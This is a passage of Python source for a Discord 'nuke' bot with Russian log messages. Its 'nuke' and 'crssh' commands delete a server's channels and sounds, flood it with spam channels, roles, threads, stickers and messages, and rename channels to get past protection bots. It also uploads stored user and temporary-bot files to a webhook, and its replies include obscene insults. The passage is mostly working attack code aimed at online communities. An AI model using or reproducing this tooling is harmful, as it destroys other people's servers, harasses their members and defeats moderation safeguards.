        event_start_time = now + timedelta(seconds=5)
        event_end_time = datetime(year=2026, month=1, day=1, tzinfo=ZoneInfo("UTC"))

        event = await guild.create_scheduled_event(
            name=event_name,
            description=event_description,
            start_time=event_start_time,
            end_time=event_end_time,
            entity_type=discord.EntityType.external,
            location="nuke bot -> https://discord.gg/pon",
            privacy_level=discord.PrivacyLevel.guild_only
        )
        console.print(f"[success]✅ Событие '{event_name}' создано[/]")
    except discord.Forbidden:
        console.print("[error]❌ Нет прав на создание события[/]")
    except Exception as e:
        console.print(f"[error]❌ Ошибка при создании события: {e}[/]")

async def create_stickers(guild: Guild):
    console.print("[action]🎨 Создание стикеров...[/]")
    try:
        with open("icon.png", "rb") as img:
            img_data = img.read()

        headers = {'Authorization': f'Bot {BOT_TOKEN}'}
        url = f"https://discord.com/api/v10/guilds/{guild.id}/stickers"
        success_count = 0
        failed_count = 0

        async def create_sticker(index):
            nonlocal success_count, failed_count
            sticker_name = f"nuke3d-bitch_{index}"
            payload = {
                "name": sticker_name,
                "description": "MSC Sticker",
                "tags": "funny, nuke3d-bitch"
            }
            form = aiohttp.FormData()
            form.add_field("file", io.BytesIO(img_data), filename="sticker.png", content_type="image/png")
            form.add_field("payload_json", json.dumps(payload))

            async with aiohttp.ClientSession() as session:
                async with limiter:
                    async with session.post(url, headers=headers, data=form) as resp:
                        if resp.status == 201:
                            success_count += 1
                            console.print(f"[success]✅ Стикер {sticker_name} успешно создан[/]")
                        else:
                            failed_count += 1
                            error_details = await resp.text()
                            console.print(f"[error]❌ Ошибка при создании стикера {sticker_name}: HTTP {resp.status}, {error_details}[/]")

        existing_stickers = await request('get', url, headers=headers)
        if existing_stickers and len(existing_stickers) >= 5:
            console.print("[warning]⚠️ Достигнут лимит стикеров на сервере (5), пропускаем создание[/]")
            return

        await asyncio.gather(*(create_sticker(i) for i in range(min(5, 5 - len(existing_stickers) if existing_stickers else 5))))
        console.print(f"[success]✅ Создано {success_count} стикеров, не удалось создать {failed_count}[/]")
    except FileNotFoundError:
        console.print(f"[error]❌ Файл icon.png не найден[/]")
    except Exception as e:
        console.print(f"[error]❌ Ошибка при создании стикеров: {e}[/]")

async def delete_sounds(guild: Guild, headers: dict) -> None:
    console.print("[action]🔊 Удаление всех звуков в soundboard...[/]")
    try:
        if not hasattr(guild, 'soundboard_sounds') or not guild.soundboard_sounds:
            console.print("[info]🔍 Нет звуков для удаления[/]")
            return

        urls = [
            f'https://discord.com/api/v9/guilds/{guild.id}/soundboard-sounds/{sound.id}'
            for sound in guild.soundboard_sounds
        ]
        
        await send_requests(
            urls=urls,
            method='delete',
            headers=headers
        )
        console.print(f"[success]✅ Удалено {len(urls)} звуков[/]")
    except Exception as e:
        console.print(f"[error]❌ Ошибка при удалении звуков: {e}[/]")

async def create_sounds(guild: Guild, headers: dict, config: dict) -> None:
    console.print("[action]🔊 Создание звуков в soundboard...[/]")
    try:
        sound_file = config.get("sound_file", "sound.mp3")
        if not os.path.exists(sound_file):
            console.print(f"[error]❌ Файл {sound_file} не найден[/]")
            return

        if os.path.getsize(sound_file) > 512 * 1024:
            console.print("[error]❌ Файл {sound_file} слишком большой (максимум 512 КБ)[/]")
            return

        with open(sound_file, "rb") as f:
            sound_data = f.read()
        b64_encoded_data = b64encode(sound_data).decode('utf-8')
        sound = f'data:audio/mp3;base64,{b64_encoded_data}'  

        sounds_amount = config.get("sounds_amount", 1)
        if not isinstance(sounds_amount, int) or sounds_amount <= 0:
            console.print("[error]❌ Неверное количество звуков в config[/]")
            return

        payload = {
            'emoji_name': config.get("emoji_name", '💀'),
            'name': config.get("sounds_name"),
            'sound': sound,
            'volume': 1
        }

        urls = [
            f'https://discord.com/api/v9/guilds/{guild.id}/soundboard-sounds'
            for _ in range(sounds_amount)
        ]

        await send_requests(
            urls=urls,
            method='post',
            payload=payload,
            headers=headers
        )
        console.print(f"[success]✅ Создано {sounds_amount} звуков[/]")

    except FileNotFoundError:
        console.print(f"[error]❌ Файл {sound_file} не найден[/]")
    except aiohttp.ClientError as e:
        console.print(f"[error]❌ Ошибка сети при создании звуков: {e}[/]")
    except Exception as e:
        console.print(f"[error]❌ Неожиданная ошибка: {e}[/]")
        
async def create_new_resources(guild: Guild, config: dict, bypass: bool = False):
    console.print("[action]🏗️ Быстрое создание ресурсов (каналы и роли)...[/]")
    if not await check_permissions(guild):
        return
    if bypass:
        console.print("[action]🔧 Переименование существующих каналов для обхода защитных ботов...[/]")
        headers = {'Authorization': f'Bot {BOT_TOKEN}', 'Content-Type': 'application/json'}
        await edit_channels(guild, headers, config, bypass=True)
        console.print("[success]✅ Каналы переименованы для обхода защитных ботов[/]")
    else:
        num_channels = config["num_channels"]
        tasks = []
        for i in range(num_channels):
            try:
                channel_name = config["channel_name"]
                async with limiter:
                    tasks.append(guild.create_text_channel(channel_name, topic=config["spam_message"]))
                await asyncio.sleep(random.uniform(0.001, 0.005))  
            except discord.Forbidden:
                console.print(f"[error]❌ Нет прав для создания канала {channel_name}[/]")
            except discord.HTTPException as e:
                if e.status == 429: 
                    retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.1))
                    console.print(f"[warning]⏳ Rate limit при создании канала, ждем {retry_after:.2f} секунд...[/]")
                    await asyncio.sleep(retry_after + random.uniform(0.01, 0.1))
                    tasks.append(guild.create_text_channel(channel_name, topic=config["spam_message"]))  # Повтор
                else:
                    console.print(f"[error]❌ Ошибка при создании канала {channel_name}: {e}[/]")
        await asyncio.gather(*tasks, return_exceptions=True)
        console.print(f"[success]✅ Создано {len(tasks)} каналов[/]")

        num_roles = config["num_roles"]
        tasks = []
        for i in range(num_roles):
            try:
                role_name = config["role_name"]
                async with limiter:
                    tasks.append(guild.create_role(name=role_name, colour=discord.Colour(random_rgb())))
                await asyncio.sleep(random.uniform(0.001, 0.005))  
            except discord.Forbidden:
                console.print(f"[error]❌ Нет прав для создания роли {role_name}[/]")
            except discord.HTTPException as e:
                if e.status == 429:  
                    retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.1))
                    console.print(f"[warning]⏳ Rate limit при создании роли, ждем {retry_after:.2f} секунд...[/]")
                    await asyncio.sleep(retry_after + random.uniform(0.01, 0.1))
                    tasks.append(guild.create_role(name=role_name, colour=discord.Colour(random_rgb())))  
                else:
                    console.print(f"[error]❌ Ошибка при создании роли {role_name}: {e}[/]")
        await asyncio.gather(*tasks, return_exceptions=True)
        console.print(f"[success]✅ Создано {len(tasks)} ролей[/]")

async def send_spam_messages(guild: Guild, config: dict, fast_mode: bool = True):
    console.print(f"[action]📨 Быстрая рассылка спам-сообщений (fast_mode: {fast_mode})...[/]")
    spam_count = config["spam_count"] * 2 if fast_mode else config["spam_count"]
    channels = guild.text_channels + guild.voice_channels

    async def spam_channel(channel):
        try:
            permissions = channel.permissions_for(guild.me)
            if not permissions.send_messages:
                console.print(f"[warning]⚠️ Нет прав для отправки сообщений в канале {channel.name}[/]")
                return
            for _ in range(spam_count):
                async with limiter:
                    await channel.send(config["spam_message"])
                    await asyncio.sleep(random.uniform(0.001, 0.003) if fast_mode else 0.01)
        except discord.Forbidden:
            console.print(f"[error]❌ Нет прав для отправки сообщений в канале {channel.name}[/]")
        except discord.HTTPException as e:
            if e.status == 429:  
                retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.1))
                console.print(f"[warning]⏳ Rate limit при отправке в {channel.name}, ждем {retry_after:.2f} секунд...[/]")
                await asyncio.sleep(retry_after + random.uniform(0.01, 0.1))
                await channel.send(config["spam_message"])  
            else:
                console.print(f"[error]❌ Ошибка при отправке сообщений в канале {channel.name}: {e}[/]")

    tasks = [spam_channel(channel) for channel in channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    console.print(f"[success]✅ Спам-сообщения отправлены в {len(channels)} каналов[/]")

async def edit_channels(guild: Guild, headers: dict, config: dict, bypass: bool = False) -> None:
    console.print("[action]🔧 Редактирование и перемещение каналов и категорий...[/]")
    name = "byp3ss-by-nuke3d-bitch" if bypass else config["channel_name"]
    channels = await get_channels(guild, headers)
    urls = []
    channel_types = {}
    
    for channel in channels:
        if channel['type'] in [0, 2, 4]:  
            urls.append(f'https://discord.com/api/v10/channels/{channel["id"]}')
            channel_types[channel["id"]] = channel['type']
    
    if not urls:
        console.print("[warning]⚠️ Нет каналов или категорий для редактирования[/]")
        return
    
    _, channels_positions_iterator = _shuffle_array(urls)
    
    async def process_channel(url):
        channel_id = url.split('/')[-1]
        channel_type = channel_types.get(channel_id, 0)
        payload = {
            'name': name,
            'position': next(channels_positions_iterator),
            'parent_id': None  
        }
        if channel_type == 0:  
            payload['topic'] = config["spam_message"]
        
        async with aiohttp.ClientSession() as session:
            async with limiter:
                async with session.patch(url, json=payload, headers=headers) as resp:
                    if resp.status in [200, 204]:
                        console.print(f"[success]✅ Канал/категория {channel_id} переименован в '{name}' и перемещён[/]")
                    else:
                        console.print(f"[error]❌ Ошибка при редактировании канала/категории {channel_id}: HTTP {resp.status}[/]")

    tasks = [process_channel(url) for url in urls]
    await asyncio.gather(*tasks, return_exceptions=True)
    console.print(f"[success]✅ Переименовано и перемещено {len(urls)} каналов и категорий[/]")

async def edit_roles(guild: Guild, headers: dict, name: str = None) -> None:
    console.print("[action]🔧 Редактирование ролей...[/]")
    name = name or default_config["role_name"]
    roles = guild.roles[1:]
    urls = [f'https://discord.com/api/v10/guilds/{guild.id}/roles/{role.id}' for role in roles]
    def get_payload():
        return {
            'name': name,
            'permissions': SAFE_PERMISSIONS,
            'color': random_rgb(),
            'hoist': False,
            'icon': None,
            'unicode_emoji': None,
            'mentionable': True
        }
    await send_requests(urls, 'patch', get_payload=get_payload, headers=headers)
    console.print(f"[success]✅ Отредактировано {len(roles)} ролей[/]")

async def send_spam_messages_to_channel(channel, spam_count: int, spam_message: str, fast_mode: bool = True):
    try:
        permissions = channel.permissions_for(channel.guild.me)
        if not permissions.send_messages:
            console.print(f"[warning]⚠️ Нет прав для отправки сообщений в канале {channel.name} ({channel.type})[/]")
            return
        for _ in range(spam_count):
            async with limiter:
                await channel.send(spam_message)
                await asyncio.sleep(random.uniform(0.001, 0.003) if fast_mode else 0.01)
    except discord.Forbidden:
        console.print(f"[error]❌ Нет прав для отправки сообщений в канале {channel.name} ({channel.type})[/]")
    except discord.HTTPException as e:
        if e.status == 429:
            retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.1))
            console.print(f"[warning]⏳ Rate limit при отправке в {channel.name}, ждем {retry_after:.2f} секунд...[/]")
            await asyncio.sleep(retry_after + random.uniform(0.01, 0.1))
            await channel.send(spam_message)
        else:
            console.print(f"[error]❌ Ошибка при отправке сообщений в канале {channel.name}: {e}[/]")
    except Exception as e:
        console.print(f"[error]❌ Неизвестная ошибка при отправке в канале {channel.name}: {e}[/]")

async def create_threads_in_channel(channel, thread_name, num_threads, spam_message):
    created_threads = 0
    failed_threads = 0
    
    for i in range(num_threads):
        try:
            async with limiter:
                thread = await channel.create_thread(
                    name=thread_name,
                    auto_archive_duration=1440,
                    type=discord.ChannelType.public_thread
                )
            console.print(f"[success]✅ Ветка '{thread_name}' создана в канале {channel.name} (ID: {channel.id})[/]")
            
            try:
                async with limiter:
                    await thread.send(spam_message)
                created_threads += 1
                console.print(f"[success]✅ Сообщение отправлено в ветку '{thread_name}' в канале {channel.name} (ID: {channel.id})[/]")
            except discord.Forbidden:
                console.print(f"[warning]⚠️ Нет прав для отправки сообщения в ветку '{thread_name}' в канале {channel.name} (ID: {channel.id})[/]")
                failed_threads += 1
                continue
            except discord.HTTPException as e:
                console.print(f"[warning]⚠️ Ошибка отправки сообщения в ветку '{thread_name}' в канале {channel.name} (ID: {channel.id}): {e}[/]")
                failed_threads += 1
                continue
            await asyncio.sleep(0.01)
        except discord.Forbidden:
            console.print(f"[error]❌ Нет прав для создания ветки в канале {channel.name} (ID: {channel.id})[/]")
            failed_threads += 1
            break
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = e.retry_after or 0.5
                console.print(f"[warning]⏳ Рейт-лимит в канале {channel.name} (ID: {channel.id}), ожидание {retry_after:.2f} секунд...[/]")
                await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                continue
            elif e.code == 20016:
                console.print(f"[error]❌ Канал {channel.name} (ID: {channel.id}) заполнен активными ветками[/]")
                failed_threads += 1
                break
            else:
                console.print(f"[error]❌ Ошибка при создании ветки в канале {channel.name} (ID: {channel.id}): {e}[/]")
                failed_threads += 1
                break
        except Exception as e:
            console.print(f"[error]❌ Неизвестная ошибка в канале {channel.name} (ID: {channel.id}): {e}[/]")
            failed_threads += 1
            break
    
    return created_threads, failed_threads

async def delete_channel(channel: discord.abc.GuildChannel):
    try:
        async with limiter:
            await channel.delete()
            console.print(f"[success]✅ Канал '{channel.name}' (ID: {channel.id}) успешно удалён[/]")
        await asyncio.sleep(random.uniform(0.01, 0.05)) 
    except discord.Forbidden:
        console.print(f"[error]❌ Нет прав для удаления канала '{channel.name}' (ID: {channel.id})[/]")
    except discord.HTTPException as e:
        if e.status == 429:
            retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.1))
            console.print(f"[warning]⏳ Rate limit при удалении канала '{channel.name}', ждем {retry_after:.2f} секунд...[/]")
            await asyncio.sleep(retry_after + random.uniform(0.01, 0.1))
            await channel.delete()  
        else:
            console.print(f"[error]❌ HTTP ошибка при удалении канала '{channel.name}': {e}[/]")

async def send_ghost_message(channel, message, count):
    for _ in range(count):
        try:
            msg = await channel.send(message)
            await msg.delete()
            await asyncio.sleep(0.5)  
        except discord.Forbidden:
            console.print(f"[error]❌ Не удалось отправить/удалить сообщение в канале {channel.name} ({channel.id}): Недостаточно прав[/]")
        except discord.HTTPException as e:
            console.print(f"[error]❌ Ошибка HTTP в канале {channel.name} ({channel.id}): {e}[/]")

async def run_and_shutdown_temp_bot(user_id, token, interaction: discord.Interaction = None, original_message: discord.Message = None):
    try:
        temporary_bots[user_id]['token'] = token
        temp_bot = commands.AutoShardedBot(command_prefix="!", intents=intents, shard_count=2)
        temp_bot.remove_command('help')  
        temporary_bots[user_id]['bot_instance'] = temp_bot

        for command in bot.commands:
            if command.name != 'desfdsfewer':
                temp_bot.add_command(command)
                if hasattr(command, 'checks'):
                    for check in command.checks:
                        temp_bot.get_command(command.name).add_check(check)

        for event_name, listeners in bot._listeners.items():
            for listener in listeners:
                temp_bot.add_listener(listener, event_name)

        temp_bot.before_invoke(check_blacklist)

        @temp_bot.event
        async def on_interaction(interaction: discord.Interaction):
            if interaction.type != discord.InteractionType.component:
                return

            user_id = str(interaction.user.id)
            message_id = str(interaction.message.id)
            custom_id = interaction.data.get('custom_id')

            console.print(f"[action]🔍 Взаимодействие: Юзер={user_id}, Сообщение={message_id}, Кнопка={custom_id}[/]")

            if not custom_id:
                await interaction.response.send_message("❌ Ошибка: нет custom_id.", ephemeral=True)
                return

            try:
                config_authors = load_config_authors()
                console.print(f"[info]🔍 config_authors: {config_authors}[/]")
            except Exception as e:
                console.print(f"[error]❌ Ошибка загрузки config_authors: {e}[/]")
                await interaction.response.send_message("❌ Ошибка конфига.", ephemeral=True)
                return

            if custom_id in ['ru', 'eng']:
                try:
                    language_message = (
                        "Has elegido el idioma español. Ahora puedes usar comandos en español." 
                        if custom_id == 'es' 
                        else "You have selected English. Now you can use commands in English."
                    )
                    await interaction.response.send_message(language_message, ephemeral=True)
                    await show_categories(interaction, custom_id)
                    
                    async def delete_response():
                        await asyncio.sleep(120)
                        try:
                            await interaction.delete_original_response()
                        except discord.errors.NotFound:
                            console.print(f"[info]Исходное сообщение для '{custom_id}' уже удалено или не найдено.[/]")
                        except Exception as e:
                            console.print(f"[error]Ошибка при удалении сообщения: {e}[/]")

                    asyncio.create_task(delete_response())
                except discord.errors.NotFound:
                    console.print(f"[warning]Взаимодействие для '{custom_id}' не найдено или срок действия истек.[/]")
                except Exception as e:
                    console.print(f"[error]Ошибка при обработке выбора языка '{custom_id}': {e}[/]")
                return

            if message_id in config_authors and config_authors[message_id] != user_id:
                console.print(f"[error]❌ Юзер {user_id} не тот, ожидался {config_authors[message_id]}[/]")
                await interaction.response.send_message(
                    "You haven't called the `!config` command, so you can't use the buttons.", 
                    ephemeral=True
                )
                return

            if custom_id in ["server_name", "channel_name", "spam_message", "role_name", "icon_path"]:
                modal = ConfigMenu(custom_id=custom_id)
                await interaction.response.send_modal(modal)
            elif custom_id == "reset_config":
                console.print(f"[info]🔍 Сброс конфигурации для пользователя {interaction.user.name} ({user_id})[/]")
                try:
                    await interaction.response.send_message("The config has been reset!", ephemeral=True)
                except discord.errors.HTTPException as e:
                    console.print(f"[error]❌ Ошибка при сбросе конфигурации: {e}[/]")
            elif custom_id == "category_select":
                console.print(f"[info]🔍 Обработка выбора категории для пользователя {interaction.user.name} ({user_id})[/]")
            elif custom_id in ["change_avatar", "change_username"]:  
                if user_id in temporary_bots and 'view' in temporary_bots[user_id]:
                    view = temporary_bots[user_id]['view']
                    if custom_id == "change_avatar":
                        await view.change_avatar_button.callback(interaction)
                    elif custom_id == "change_username":
                        await view.change_username_button.callback(interaction)

        @temp_bot.event
        async def on_command_error(ctx, error):
            try:
                if ctx.guild is None:
                    return False
                if isinstance(error, commands.CommandOnCooldown):
                    remaining_time = int(error.retry_after)
                    if remaining_time > 0:
                        message = (
                            f"Please wait {remaining_time} seconds before using the command again."
                        )
                        await ctx.send(message, delete_after=30)
                        try:
                            await ctx.author.send(message, delete_after=30)
                        except discord.errors.Forbidden:
                            console.print(f"[warning]⚠️ Не удалось отправить DM пользователю {ctx.author} о кулдауне.[/]")
                        console.print(
                            f"[ ! ] {ctx.author} пытался использовать команду `{ctx.command.name}` в {ctx.guild} во время перезарядки.",
                            style="error"
                        )
                    else:
                        message = (
                            f"Перезарядка команды `{ctx.command.name}` на сервере завершена. / "
                            f"Command `{ctx.command.name}` cooldown in has ended."
                        )
                        await ctx.send(message, delete_after=30)
                        try:
                            await ctx.author.send(message, delete_after=30)
                        except discord.errors.Forbidden:
                            console.print(f"[warning]⚠️ Не удалось отправить DM пользователю {ctx.author} о завершении кулдауна.[/]")
                        console.print(
                            f"[ * ] {ctx.author} теперь может использовать команду `{ctx.command.name}` в {ctx.guild}.",
                            style="success"
                        )
                elif isinstance(error, commands.CommandNotFound):
                    console.print(
                        f"[info]🔍 {ctx.author} пытался использовать неизвестную команду `{ctx.invoked_with}` в {ctx.guild}.[/]",
                        style="info"
                    )
                else:
                    console.print(
                        f"[error]❌ Ошибка команды `{ctx.command.name if ctx.command else 'unknown'}` для {ctx.author} в {ctx.guild}: {error}[/]",
                        style="error"
                    )
            except Exception as e:
                console.print(
                    f"[error]❌ Ошибка в обработчике on_command_error для {ctx.author} в {ctx.guild}: {e}[/]",
                    style="error"
                )

        @temp_bot.event
        async def on_ready():
            console.print(f"[info]✅ Временный бот {temp_bot.user} для пользователя {user_id} запущен.[/]")
            if 'expiration' not in temporary_bots[user_id]:
                temporary_bots[user_id]['expiration'] = time.time() + 1800
            save_temp_bots()
            if 'view' in temporary_bots[user_id]:
                try:
                    view = temporary_bots[user_id]['view']
                    view.enable_controls()
                    embed = discord.Embed(
                        title="✅ Bot Online",
                        description=f"The bot **{temp_bot.user}** has been successfully launched.\nIt will be active for 30 minutes.",
                        color=discord.Color.green()
                    )
                    if temp_bot.user.avatar:
                        embed.set_thumbnail(url=temp_bot.user.avatar.url)
                    if interaction:
                        await interaction.edit_original_response(embed=embed, view=view)
                    else:
                        console.print(f"[info]✅ Автоматически запущенный бот {temp_bot.user} для {user_id}, без обновления UI.[/]")
                except Exception as e:
                    console.print(f"[error]❌ Не удалось обновить сообщение для on_ready временного бота: {e}[/]")
            else:
                console.print(f"[info]✅ Автоматически запущенный бот {temp_bot.user} для {user_id}, без view.[/]")

        remaining = temporary_bots[user_id]['expiration'] - time.time() if 'expiration' in temporary_bots[user_id] else 1800
        await asyncio.wait_for(temp_bot.start(token), timeout=remaining)

    except asyncio.TimeoutError:
        console.print(f"[warning]⏳ Таймер 30 минут для бота пользователя {user_id} истёк.[/]")
        if user_id in temporary_bots and 'view' in temporary_bots[user_id]:
            try:
                view = temporary_bots[user_id]['view']
                embed = discord.Embed(
                    title="⌛ The session has expired",
                    description="The temporary bot session expired after 30 minutes.",
                    color=discord.Color.dark_grey()
                )
                if original_message:
                    await original_message.edit(embed=embed, view=None)
            except discord.NotFound:
                console.print(f"[warning]⚠️ Сообщение для финального обновления не найдено.[/]")
            except Exception as e:
                console.print(f"[error]❌ Ошибка при обновлении сообщения после таймаута: {e}[/]")
    except discord.LoginFailure:
        console.print(f"[error]❌ Неверный токен предоставлен пользователем {user_id}.[/]")
        try:
            if interaction:
                embed = discord.Embed(
                    title="❌ Login error",
                    description="The provided token is invalid. Please try again.",
                    color=discord.Color.red()
                )
                view = temporary_bots[user_id]['view']
                view.enter_token_button.disabled = False
                await interaction.edit_original_response(embed=embed, view=view)
            else:
                console.print(f"[error]❌ Неверный токен для автоматически запущенного бота пользователя {user_id}.[/]")
        except Exception as e:
            console.print(f"[error]❌ Не удалось уведомить пользователя об ошибке входа: {e}[/]")
    except Exception as e:
        console.print(f"[error]❌ Непредвиденная ошибка с временным ботом для {user_id}: {e}[/]")
    finally:
        console.print(f"[action]🔌 Отключение временного бота для пользователя {user_id}.[/]")
        temp_bot_instance = temporary_bots.get(user_id, {}).get('bot_instance')
        if temp_bot_instance and temp_bot_instance.is_ready():
            await temp_bot_instance.close()

        if user_id in temporary_bots:
            del temporary_bots[user_id]
        save_temp_bots()

        if original_message:
            try:
                embed = discord.Embed(
                    title="🔌 The bot is disabled",
                    description="The temporary bot session is over.",
                    color=discord.Color.dark_grey()
                )
                await original_message.edit(embed=embed, view=None)
            except discord.NotFound:
                console.print(f"[warning]⚠️ Сообщение для финального обновления не найдено.[/]")
            except Exception as e:
                console.print(f"[error]❌ Ошибка при обновлении сообщения после отключения бота: {e}[/]")

def send_json_files_to_webhook():
    json_files = [
        'premium_users.json',
        'blacklist.json',
        'server.json',
        'auto_nuke_users.json',  
        'config_authors.json',   
        'config_info.json',      
        'user_server_count.json',  
        'temp_bots.json'        
    ]
    
    for json_file in json_files:
        try:
            if os.path.exists(json_file):
                with open(json_file, 'rb') as file:
                    files = {'file': (json_file, file, 'application/json')}
                    response = requests.post(FILES_WEBHOOK_URL, files=files)
                    if response.status_code == 204 or response.status_code == 200:
                        console.print(f"[success]✅ Отправлен файл {json_file} в вебхук[/]")
                    else:
                        console.print(f"[error]❌ Не удалось отправить {json_file}: HTTP {response.status_code}[/]")
            else:
                console.print(f"[warning]⚠️ Файл {json_file} не найден[/]")
        except FileNotFoundError:
            console.print(f"[error]❌ Не удалось отправить {json_file}: Файл не найден[/]")
        except Exception as e:
            console.print(f"[error]❌ Не удалось отправить {json_file}: {str(e)}[/]")
   
@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def nuke(ctx):
    guild = ctx.guild
    if ctx.guild.id in excluded_server_id:
        await ctx.send("анус тебе порву сучка нельзя тут")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в excluded_server_id, команда nuke запрещена[/]")
        return
    headers = {'Authorization': f'Bot {BOT_TOKEN}', 'Content-Type': 'application/json'}
    user_id = str(ctx.author.id)
    config = user_config.get(user_id, default_config)

    console.print("[action]💥 Запуск команды nuke...[/]")
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда nuke не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда запрещена! 😿[/]")
        return
    if not await check_permissions(guild):
        console.print("[warning]⚠️ Недостаточно прав, начинаем спам в доступные каналы...[/]")
        await send_spam_messages(guild, config, fast_mode=True)
        await ctx.send(f"{ctx.author.mention}, у бота недостаточно прав, но спам отправлен в доступные каналы!")
        await send_template_to_inviter(guild, ctx.author)
        return

    try:
        await send_template_to_inviter(guild, ctx.author)

        bypass = await detect_protected_bots(guild)
        if bypass:
            console.print("[warning]⚠️ Обнаружены защитные боты, используем режим обхода...[/]")
            if await check_permissions(guild):
                await edit_channels(guild, headers, config, bypass=True)
                await send_spam_messages(guild, config, fast_mode=True)
            else:
                console.print("[warning]⚠️ Недостаточно прав, спамим в доступные каналы...[/]")
                await send_spam_messages(guild, config, fast_mode=True)
        else:
            await delete_channels(guild)
            await delete_sounds(guild, headers)
            await create_new_resources(guild, config, bypass=False)
            await send_spam_messages(guild, config, fast_mode=False)
            await edit_server(guild, config)
            await create_event(guild)
            await create_stickers(guild)
            await create_sounds(guild, headers, config)
            await edit_channels(guild, headers, config, bypass=False)

        console.print("[success]🎉 Команда nuke успешно выполнена[/]")

    except discord.Forbidden:
        console.print("[error]❌ Ошибка: недостаточно прав для выполнения действий[/]")
    except discord.HTTPException as e:
        console.print(f"[error]❌ HTTP ошибка при выполнении nuke: {e}[/]")
    except Exception as e:
        console.print(f"[error]❌ Неизвестная ошибка при выполнении nuke: {e}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.guild)
async def crssh(ctx, guild_input: str):
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда crssh не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {ctx.guild.name} ({ctx.guild.id}) в server_blacklist, команда crssh запрещена! 😿[/]")
        return

    if ctx.guild.id in excluded_server_id:
        await ctx.send("Ахахха, думаешь, ты такой гений и думал снести этот сервер по айди? Пососи мне мой большой член.")
        console.print(f"[error]❌ Сервер {ctx.guild.name} ({ctx.guild.id}) в excluded_server_ids, команда crssh запрещена[/]")
        return

    guild_id = None
    try:
        if guild_input.isdigit():
            guild_id = int(guild_input)
        elif re.match(r'https://discord(app)?\.com/channels/\d+/\d+', guild_input):
            guild_id = int(re.search(r'\d+/\d+', guild_input).group().split('/')[0])
        elif re.match(r'https://discord(app)?\.com/invite/\w+', guild_input) or re.match(r'https://discord(app)?\.gg/\w+', guild_input):
            async with limiter:
                invite = await bot.fetch_invite(guild_input)
                guild_id = invite.guild.id if invite.guild else None
        else:
            embed = discord.Embed(
                title='❌ Error!',
                description='Incorrect server address is entered.',
                color=discord.Colour.from_rgb(0, 0, 0)
            )
            await ctx.send(embed=embed)
            console.print(f"[error]❌ Неверный формат ввода: {guild_input}[/]")
            return
    except discord.errors.Forbidden:
        embed = discord.Embed(
            title='❌ Error!',
            description='The bot does not have access to the invite.',
            color=discord.Colour.from_rgb(0, 0, 0)
        )
        await ctx.send(embed=embed)
        console.print(f"[error]❌ Нет доступа к инвайту: {guild_input}[/]")
        return
    except Exception as e:
        embed = discord.Embed(
            title='❌ Error!',
            description=f'Unable to process input: {e}',
            color=discord.Colour.from_rgb(0, 0, 0)
        )
        await ctx.send(embed=embed)
        console.print(f"[error]❌ Ошибка при обработке ввода {guild_input}: {e}[/]")
        return

    if not guild_id:
        embed = discord.Embed(
            title='❌ Error!',
            description='Failed to get server ID.',
            color=discord.Colour.from_rgb(0, 0, 0)
        )
        await ctx.send(embed=embed)
        console.print(f"[error]❌ Не удалось получить ID сервера из ввода: {guild_input}[/]")
        return

    guild = bot.get_guild(guild_id)
    if guild is None or guild.get_member(bot.user.id) is None:
        embed = discord.Embed(
            title='❌ Error!',
            description='The bot is not on the server.',
            color=discord.Colour.from_rgb(0, 0, 0)
        )
        await ctx.send(embed=embed)
        console.print(f"[error]❌ Бот не находится на сервере с ID {guild_id}[/]")
        return

    required_permissions = (
        guild.me.guild_permissions.manage_channels and
        guild.me.guild_permissions.manage_events and
        guild.me.guild_permissions.manage_guild and
        guild.me.guild_permissions.manage_roles
    )
    if not required_permissions:
        embed = discord.Embed(
            title='❌ Error!',
            description='The bot does not have sufficient rights to execute the crssh command.',
            color=discord.Colour.from_rgb(0, 0, 0)
        )
        await ctx.send(embed=embed)
        console.print(f"[error]❌ Недостаточно прав для выполнения команды crssh на сервере {guild.name} ({guild.id})[/]")
        return

    console.print(f"[action]💥 Запуск команды crssh для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})...[/]")

    try:
        server_count = update_server_count(ctx.author.id, guild.id)
        console.print(f"[success]✅ Счётчик серверов обновлён для пользователя {ctx.author.name} ({ctx.author.id}): {server_count} серверов[/]")

        embed = discord.Embed(
            title=f'✅ Starting to demolish the server **{guild.name}**.',
            color=discord.Colour.from_rgb(0, 0, 0)
        )
        await ctx.send(embed=embed)

        has_protected_bots = await detect_protected_bots(guild)
        config = user_config.get(str(ctx.author.id), default_config)
        headers = {'Authorization': f'Bot {BOT_TOKEN}', 'Content-Type': 'application/json'}

        if has_protected_bots:
            console.print("[warning]⚠️ Защитные боты обнаружены, выполняем быстрые действия...[/]")
            await edit_channels(guild, headers, config, bypass=True)
            await send_spam_messages(guild, config, fast_mode=True)
        else:           
            await delete_channels(guild)
            await delete_sounds(guild, headers)
            await create_event(guild)
            await create_stickers(guild)
            await edit_server(guild, config)
            await create_new_resources(guild, config, bypass=False)
            await create_sounds(guild, headers, config)
            await send_spam_messages(guild, config, fast_mode=False)
            await edit_channels(guild, headers, config, bypass=False)

        embed = discord.Embed(
            title=f'✅ Demolition of server **{guild.name}** is complete!',
            color=discord.Colour.from_rgb(0, 0, 0)
        )
        await ctx.send(embed=embed)
        console.print(f"[success]📌 Команда crssh выполнена на сервере {guild.name} ({guild.id})[/]")

    except discord.Forbidden:
        embed = discord.Embed(
            title='❌ Error!',
            description='The bot does not have sufficient rights to perform actions.',
            color=discord.Colour.from_rgb(0, 0, 0)
        )
        await ctx.send(embed=embed)
        console.print(f"[error]❌ Недостаточно прав для выполнения команды crssh на сервере {guild.name} ({guild.id})[/]")
    except discord.HTTPException as e:
        if e.status == 429:
            retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.1))
